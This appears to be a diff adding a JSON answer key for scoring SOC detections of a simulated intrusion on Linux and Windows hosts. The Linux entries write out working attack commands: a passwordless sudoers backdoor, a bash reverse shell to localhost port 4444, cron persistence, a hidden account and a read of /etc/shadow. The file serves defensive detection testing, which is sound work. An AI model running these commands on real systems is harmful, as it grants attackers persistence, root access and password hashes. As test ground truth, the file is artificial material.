@@ -1,0 +1,184 @@
+{
+  "generated_at": "2026-11-03T23:16:52Z",
+  "note": "Ground truth for scoring SOC detections. Timestamps are UTC ISO 8601.",
+  "totals": {
+    "windows": 6,
+    "linux": 6,
+    "total": 12
+  },
+  "actions": [
+    {
+      "action_number": 1,
+      "action": "Creating user testattacker",
+      "description": "Local account creation for persistence",
+      "command": "useradd -M -s /usr/sbin/nologin testattacker",
+      "timestamp": "2026-11-03T23:14:21Z",
+      "result": "executed",
+      "mitre_technique": "T1136.001 - Create Local Account",
+      "expected_detection": [
+        {
+          "source": "auditd",
+          "key": "identity",
+          "event": "user/group file write"
+        },
+        {
+          "source": "auth.log",
+          "event": "useradd"
+        }
+      ],
+      "platform": "linux"
+    },
+    {
+      "action_number": 2,
+      "action": "Modifying sudoers",
+      "description": "Passwordless sudo drop-in for the new account",
+      "command": "echo 'testattacker ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/backdoor",
+      "timestamp": "2026-11-03T23:14:21Z",
+      "result": "executed",
+      "mitre_technique": "T1548.003 - Sudo and Sudo Caching",
+      "expected_detection": [
+        {
+          "source": "auditd",
+          "key": "sudoers",
+          "event": "/etc/sudoers.d write"
+        }
+      ],
+      "platform": "linux"
+    },
+    {
+      "action_number": 3,
+      "action": "Executing from /tmp",
+      "description": "Run a copied binary from a world-writable path",
+      "command": "cp /usr/bin/id /tmp/suspicious_bin && /tmp/suspicious_bin",
+      "timestamp": "2026-11-03T23:14:22Z",
+      "result": "blocked",
+      "mitre_technique": "T1059 - Command and Scripting Interpreter",
+      "expected_detection": [
+        {
+          "source": "auditd",
+          "key": "process_exec",
+          "event": "execve (success or EACCES)"
+        }
+      ],
+      "platform": "linux"
+    },
+    {
+      "action_number": 4,
+      "action": "Reverse shell attempt (localhost)",
+      "description": "Outbound shell to 127.0.0.1:4444, nothing listening",
+      "command": "bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'",
+      "timestamp": "2026-11-03T23:14:23Z",
+      "result": "attempted",
+      "mitre_technique": "T1059.004 - Unix Shell",
+      "expected_detection": [
+        {
+          "source": "auditd",
+          "key": "network_connect",
+          "event": "socket/connect to 127.0.0.1:4444"
+        }
+      ],
+      "platform": "linux"
+    },
+    {
+      "action_number": 5,
+      "action": "Cron persistence",
+      "description": "Minute-by-minute beacon dropped into /etc/cron.d",
+      "command": "echo '* * * * * /tmp/beacon.sh' > /etc/cron.d/persistence_test",
+      "timestamp": "2026-11-03T23:14:23Z",
+      "result": "executed",
+      "mitre_technique": "T1053.003 - Cron",
+      "expected_detection": [
+        {
+          "source": "auditd",
+          "key": "cron_persist",
+          "event": "/etc/cron.d write"
+        }
+      ],
+      "platform": "linux"
+    },
+    {
+      "action_number": 6,
+      "action": "Accessing /etc/shadow",
+      "description": "Read the password hash database",
+      "command": "cat /etc/shadow > /dev/null",
+      "timestamp": "2026-11-03T23:14:23Z",
+      "result": "executed",
+      "mitre_technique": "T1003.008 - /etc/passwd and /etc/shadow",
+      "expected_detection": [
+        {
+          "source": "auditd",
+          "key": "identity",
+          "event": "read of /etc/shadow"
+        }
+      ],
+      "platform": "linux"
+    },
+    {
+      "action_number": 1,
+      "description": "Create local user 'support_update'",
+      "timestamp": "2026-11-03T22:59:03Z",
+      "expected_detection": [
+        "Security EID 4720"
+      ],
+      "mitre_technique": "T1136.001 Create Account: Local Account",
+      "entity": "support_update",
+      "platform": "windows"
+    },
+    {
+      "action_number": 2,
+      "description": "Add 'support_update' to Administrators group",
+      "timestamp": "2026-11-03T22:59:04Z",
+      "expected_detection": [
+        "Security EID 4732"
+      ],
+      "mitre_technique": "T1098 Account Manipulation",
+      "entity": "support_update",
+      "platform": "windows"
+    },
+    {
+      "action_number": 3,
+      "description": "Run encoded PowerShell command (harmless payload)",
+      "timestamp": "2026-11-03T22:59:08Z",
+      "expected_detection": [
+        "PowerShell EID 4104",
+        "Sysmon EID 1"
+      ],
+      "mitre_technique": "T1059.001 PowerShell / T1027 Obfuscated Files or Information",
+      "entity": "VwByAGkAdABlAC0ASABvAHMAdAAgACIAQwAyACAAYgBlAGEAYwBvAG4AIgA=",
+      "platform": "windows"
+    },
+    {
+      "action_number": 4,
+      "description": "Create scheduled task 'MedDefenseSimPersistence' for persistence",
+      "timestamp": "2026-11-03T22:59:08Z",
+      "expected_detection": [
+        "Sysmon EID 1"
+      ],
+      "mitre_technique": "T1053.005 Scheduled Task/Job: Scheduled Task",
+      "entity": "MedDefenseSimPersistence",
+      "platform": "windows"
+    },
+    {
+      "action_number": 5,
+      "description": "Initiate outbound network connection to 8.8.8.8",
+      "timestamp": "2026-11-03T22:59:09Z",
+      "expected_detection": [
+        "Sysmon EID 3"
+      ],
+      "mitre_technique": "T1071 Application Layer Protocol / T1041 Exfiltration Over C2 Channel",
+      "entity": "8.8.8.8",
+      "platform": "windows"
+    },
+    {
+      "action_number": 6,
+      "description": "Drop file in Startup folder for persistence",
+      "timestamp": "2026-11-03T22:59:12Z",
+      "expected_detection": [
+        "Sysmon EID 11"
+      ],
+      "mitre_technique": "T1547.001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
+      "entity": "meddefense_sim_payload.txt",
+      "platform": "windows"
+    }
+  ]
+}
